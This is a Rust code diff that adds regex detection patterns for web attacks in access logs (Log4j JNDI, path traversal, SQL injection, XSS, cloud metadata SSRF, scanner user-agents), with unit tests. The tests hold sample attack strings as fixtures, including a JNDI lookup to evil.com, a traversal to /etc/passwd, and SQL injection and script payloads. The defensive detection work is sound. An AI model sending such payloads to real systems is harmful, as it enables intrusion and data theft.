@@ -109,6 +109,48 @@ pub fn patterns() -> Result<Vec<DetectionPattern>> {
             )?,
             reason: "Web PHP code injection via query string",
         },
+        // Log4j JNDI RCE (CVE-2021-44228) — matches in path or query
+        DetectionPattern {
+            regex: Regex::new(
+                r#"^(\d+\.\d+\.\d+\.\d+) .*?(?:\$\{jndi:|%24%7Bjndi:)"#,
+            )?,
+            reason: "Web Log4j JNDI RCE attempt (CVE-2021-44228)",
+        },
+        // Path Traversal / LFI (Local File Inclusion)
+        DetectionPattern {
+            regex: Regex::new(
+                r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "(?i)[a-z]+ [^"]*(?:\.\./\.\./|\.\.\\\.\.\\|%2e%2e%2f|%252e%252e%252f)"#,
+            )?,
+            reason: "Web Path Traversal / LFI probe",
+        },
+        // SQL Injection (Basic booleans and UNION SELECT probes)
+        DetectionPattern {
+            regex: Regex::new(
+                r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "(?i)[a-z]+ [^"]*(?:UNION(?:%20|\+)(?:ALL(?:%20|\+))?SELECT|%27\s*(?:OR|AND)\s*(?:%27|\d)|'\s*(?:OR|AND)\s*('\d|\d))"#
+            )?,
+            reason: "Web SQL Injection attempt",
+        },
+        // Cross-Site Scripting (XSS) probe
+        DetectionPattern {
+            regex: Regex::new(
+                r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "(?i)[a-z]+ [^"]*(?:<script>|%3Cscript%3E|javascript:|alert\()"#
+            )?,
+            reason: "Web Cross-Site Scripting (XSS) probe",
+        },
+        // Cloud Metadata SSRF probe (AWS/GCP/Azure)
+        DetectionPattern {
+            regex: Regex::new(
+                r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "[A-Z]+ [^"]*169\.254\.169\.254"#
+            )?,
+            reason: "Web Cloud Metadata SSRF probe",
+        },
+        // Malicious Vulnerability Scanners via User-Agent (Nuclei, ZGrab, Masscan, etc)
+        DetectionPattern {
+            regex: Regex::new(
+                r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "[A-Z]+ [^"]*" \d+ \d+ "[^"]*" "(?i)[^"]*(?:nuclei|zgrab|masscan|zmeu|nikto)"#
+            )?,
+            reason: "Web Malicious Security Scanner bot",
+        },
     ])
 }
 
@@ -250,5 +292,73 @@ mod tests {
             re.captures(line).unwrap().get(1).unwrap().as_str(),
             "192.0.2.77"
         );
+    }
+
+    #[test]
+    fn test_nginx_access_log4j_jndi() {
+        let re = Regex::new(
+            r#"^(\d+\.\d+\.\d+\.\d+) .*?(?:\$\{jndi:|%24%7Bjndi:)"#,
+        )
+        .unwrap();
+
+        let line = r#"198.51.100.1 - - [05/Mar/2026:06:00:00 +0000] "GET /?v=${jndi:ldap://evil.com/a} HTTP/1.1" 404 0 "-" "Mozilla""#;
+        assert_eq!(re.captures(line).unwrap().get(1).unwrap().as_str(), "198.51.100.1");
+    }
+
+    #[test]
+    fn test_nginx_access_path_traversal() {
+        let re = Regex::new(
+            r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "(?i)[a-z]+ [^"]*(?:\.\./\.\./|\.\.\\\.\.\\|%2e%2e%2f|%252e%252e%252f)"#,
+        )
+        .unwrap();
+
+        let line = r#"203.0.113.88 - - [05/Mar/2026:06:10:00 +0000] "GET /../../../etc/passwd HTTP/1.1" 403 0 "-" "curl""#;
+        assert_eq!(re.captures(line).unwrap().get(1).unwrap().as_str(), "203.0.113.88");
+        
+        let line2 = r#"203.0.113.89 - - [05/Mar/2026:06:10:00 +0000] "GET /%2e%2e%2f%2e%2e%2fetc/passwd HTTP/1.1" 403 0 "-" "curl""#;
+        assert_eq!(re.captures(line2).unwrap().get(1).unwrap().as_str(), "203.0.113.89");
+    }
+
+    #[test]
+    fn test_nginx_access_sqli() {
+        let re = Regex::new(
+            r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "(?i)[a-z]+ [^"]*(?:UNION(?:%20|\+)(?:ALL(?:%20|\+))?SELECT|%27\s*(?:OR|AND)\s*(?:%27|\d)|'\s*(?:OR|AND)\s*('\d|\d))"#
+        ).unwrap();
+
+        let line1 = r#"192.0.2.100 - - [05/Mar/2026:06:20:00 +0000] "GET /?id=1' OR 1=1 HTTP/1.1" 200 44 "-" "Mozilla""#;
+        assert_eq!(re.captures(line1).unwrap().get(1).unwrap().as_str(), "192.0.2.100");
+
+        let line2 = r#"192.0.2.101 - - [05/Mar/2026:06:20:00 +0000] "GET /?id=1 UNION+ALL+SELECT 1,2,3 HTTP/1.1" 200 44 "-" "Mozilla""#;
+        assert_eq!(re.captures(line2).unwrap().get(1).unwrap().as_str(), "192.0.2.101");
+    }
+
+    #[test]
+    fn test_nginx_access_xss() {
+        let re = Regex::new(
+            r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "(?i)[a-z]+ [^"]*(?:<script>|%3Cscript%3E|javascript:|alert\()"#
+        ).unwrap();
+
+        let line = r#"198.51.100.40 - - [05/Mar/2026:06:30:00 +0000] "GET /?q=<script>alert(1)</script> HTTP/1.1" 200 44 "-" "Mozilla""#;
+        assert_eq!(re.captures(line).unwrap().get(1).unwrap().as_str(), "198.51.100.40");
+    }
+
+    #[test]
+    fn test_nginx_access_metadata_ssrf() {
+        let re = Regex::new(
+            r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "[A-Z]+ [^"]*169\.254\.169\.254"#
+        ).unwrap();
+
+        let line = r#"10.0.0.5 - - [05/Mar/2026:06:40:00 +0000] "GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 403 0 "-" "-""#;
+        assert_eq!(re.captures(line).unwrap().get(1).unwrap().as_str(), "10.0.0.5");
+    }
+
+    #[test]
+    fn test_nginx_access_scanner_bots() {
+        let re = Regex::new(
+            r#"^(\d+\.\d+\.\d+\.\d+) \S+ \S+ \[[^\]]+\] "[A-Z]+ [^"]*" \d+ \d+ "[^"]*" "(?i)[^"]*(?:nuclei|zgrab|masscan|zmeu|nikto)"#
+        ).unwrap();
+
+        let line = r#"172.16.0.42 - - [05/Mar/2026:06:50:00 +0000] "GET / HTTP/1.1" 200 1024 "-" "nuclei-v2.8.0""#;
+        assert_eq!(re.captures(line).unwrap().get(1).unwrap().as_str(), "172.16.0.42");
     }
 }
